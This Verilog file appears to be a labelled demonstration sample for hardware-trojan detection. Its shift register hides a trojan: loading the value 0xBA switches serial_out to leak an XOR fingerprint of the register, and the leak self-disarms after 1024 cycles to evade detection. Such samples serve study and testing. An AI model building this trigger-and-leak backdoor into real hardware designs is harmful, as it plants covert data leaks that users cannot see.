// =============================================================================
// VeriFlow - Shift Register with Hardware Trojan (DEMO ONLY)
// =============================================================================
// ⚠️  WARNING: Intentionally injected trojan for demonstration.
//
// TROJAN TYPE: Covert channel via serial_out
// TRIGGER: Specific parallel_in pattern
// PAYLOAD: Leaks internal state through serial_out timing
// =============================================================================

module shift_register_trojan #(
    parameter WIDTH = 8
)(
    input  wire                clk,
    input  wire                rst_n,
    input  wire                enable,
    input  wire                load,
    input  wire                direction,
    input  wire                serial_in,
    input  wire [WIDTH-1:0]    parallel_in,
    output wire                serial_out,
    output wire [WIDTH-1:0]    parallel_out
);

    reg [WIDTH-1:0] shift_reg;

    // ╔═══════════════════════════════════════════════════════════╗
    // ║  TROJAN: Covert exfiltration channel                     ║
    // ║  When a magic pattern is loaded, the serial_out begins   ║
    // ║  leaking XOR of all register bits (side-channel)         ║
    // ╚═══════════════════════════════════════════════════════════╝
    reg        exfil_mode;           // HT-005: Covert channel flag
    reg [15:0] leak_counter;          // HT-001: Unused trigger logic
    wire       secret_bit;

    assign secret_bit = ^shift_reg;  // XOR-reduce: single-bit fingerprint

    // Normal vs exfiltration output mux
    assign parallel_out = shift_reg;
    assign serial_out   = exfil_mode ?
                          secret_bit :                                    // TROJAN: leaked
                          (direction ? shift_reg[WIDTH-1] : shift_reg[0]); // Normal

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            exfil_mode   <= 1'b0;
            leak_counter <= 16'd0;
        end else begin
            // HT-001: Trigger on rare magic load value
            if (load && parallel_in == 8'hBA)
                exfil_mode <= 1'b1;

            if (exfil_mode)
                leak_counter <= leak_counter + 1;

            // Self-disarm after 1024 cycles to avoid detection
            if (leak_counter == 16'd1024)
                exfil_mode <= 1'b0;
        end
    end

    // === Main shift register logic ===
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            shift_reg <= {WIDTH{1'b0}};
        end else if (load) begin
            shift_reg <= parallel_in;
        end else if (enable) begin
            if (direction)
                shift_reg <= {shift_reg[WIDTH-2:0], serial_in};
            else
                shift_reg <= {serial_in, shift_reg[WIDTH-1:1]};
        end
    end

endmodule
